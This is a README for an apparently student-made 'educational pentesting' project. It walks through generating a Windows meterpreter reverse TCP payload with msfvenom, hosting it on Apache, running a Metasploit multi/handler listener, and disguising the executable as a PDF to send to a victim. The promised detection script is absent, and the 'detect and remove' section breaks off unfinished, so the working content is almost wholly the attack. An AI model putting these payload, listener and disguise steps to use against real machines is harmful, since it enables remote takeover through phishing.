# cyber-sentinal
# 🛡️ (based on) ----Reverse Shell Listener & Malicious File Detector – Educational Pentesting Project 

This project demonstrates how to set up a **reverse TCP shell payload** using the Metasploit Framework and how to detect and remove **suspicious or potentially malicious files** using a custom Python script.

> ⚠️ This project is strictly for **educational** and **ethical hacking** purposes in **controlled lab environments only**.

---

## 🔧 Features

- ✅ Generate `windows/meterpreter/reverse_tcp` payloads with `msfvenom`
- ✅ Host payloads on a local Apache2 web server (`/var/www/html`)
- ✅ Configure and run Metasploit `multi/handler` to catch incoming shells
- ✅ Disguise `.exe` payloads as `.pdf` using social engineering tactics
- ✅ Scan for suspicious files and attempt to delete them

---

## 🧠 Educational Objectives

- Learn how reverse shells operate and connect back to a C2 listener
- Understand how payloads can be served and disguised for social engineering
- Gain hands-on experience with Metasploit Framework and msfvenom
- Develop basic detection techniques for suspicious or unauthorized files

---

## 📌 Requirements

- Kali Linux (2023 or newer preferred)
- Metasploit Framework
- Apache2 (for payload hosting) 
- Python3
- Local network or port-forwarding capability

---
NOW LET's START WITH REAL DEAL---------

## 🚀 Getting Started

### 1. Generate Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o /var/www/html/evil.exe
```

### 2. Start Metasploit Listener

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run
```

### 3. Deliver Payload

Host your `.exe` file via your web server or disguise it (e.g., rename to `report.pdf.exe`) and send it to your test victim in a controlled lab environment.

### 4. Detect and Remove Suspicious Files (Python Script)

Example behavior:

- Scans directories for `.exe`, `.bat`, `.vbs`, etc.
- Compares known good and suspicious file patterns
- Deletes files that match suspicious criteria (optional, controlled)

```bash
python3 detect_and_remove.py
```

---

## 🧪 Example Use Cases

- Simulate a phishing attack in a closed lab
- Raise awareness about file-based malware
- Test detection tools
- Practice incident response

---

## 📁 Folder Structure

```
├── detect_and_remove.py
├── payloads/
│   └── evil.exe
└── README.md
```

---

## ⚠️ Disclaimer

This tool is for **educational** and **research** purposes only. Misuse of this tool outside of authorized environments is illegal and unethical. Always get proper consent before running any form of penetration testing or file manipulation.

---

--NOW COMING TO DETECT AND REMOVE IT-----
we are going to use 


## 👨‍💻 Author

Made with 💻 and ⚔️ for learning and awareness in cybersecurity.

by CODE BLOODED
